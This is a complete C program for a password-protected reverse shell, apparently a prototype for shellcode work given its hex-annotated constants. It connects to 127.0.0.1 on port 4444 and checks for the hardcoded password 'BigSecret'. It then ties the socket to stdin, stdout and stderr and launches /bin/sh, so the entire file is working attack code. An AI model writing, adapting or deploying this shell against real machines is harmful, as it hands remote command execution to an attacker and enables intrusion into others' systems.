#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<netinet/in.h>
#include<error.h>
#include<strings.h>
#include<unistd.h>
#include<arpa/inet.h>


main(int argc, char **argv)
{
	struct sockaddr_in server;
	int sock;
	int sockaddr_len = sizeof(struct sockaddr_in);
	char *arguments[] = { "/bin/sh", 0 };
	char *in[] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
	
	// Create Socket
	if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)  // 2, 1, 0
	{
		perror("socket: ");
		exit(-1);
	}
		
	server.sin_family = AF_INET;	// 2
	server.sin_port = htons(4444); 	// 0x5c11
	server.sin_addr.s_addr = inet_addr("127.0.0.1");  // 0x0100007f
	bzero(&server.sin_zero, 8);
	
	// Connect to remote host		
	if((connect(sock, (struct sockaddr *)&server, sockaddr_len)) == -1)
	{
		perror("connect: ");
		exit(-1);
	}

	// Check password
	send(sock, (char*)"Anyone there?\n", 14, 0);
	read(sock, &in, 10);

	if(strncmp("BigSecret", in, 9))
	{
		send(sock, (char*)"Nope\n", 5, 0);
        exit(-1);
    }
    
	// Allow access
	send(sock, (char*)"Hi!\n", 4, 0);

	dup2(sock, 0);	// STDIN
	dup2(sock, 1);	// STDOUT
	dup2(sock, 2);	// STDERR

	execve(arguments[0], &arguments[0], NULL);	
}

	
